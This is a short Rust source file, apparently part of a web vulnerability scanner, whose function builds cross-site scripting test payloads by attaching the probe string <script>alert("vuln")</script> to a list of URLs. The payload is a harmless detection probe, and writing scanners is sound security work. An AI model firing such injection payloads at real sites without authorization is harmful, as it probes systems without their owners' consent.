
use crate::objects::payload;
use crate::gen::utils;

pub fn generate_xssp(urls: &[String]) -> Vec<payload::Payload> {
    let script = r#"<script>alert("vuln")</script>"#;
    utils::generate_p(urls, script)
}

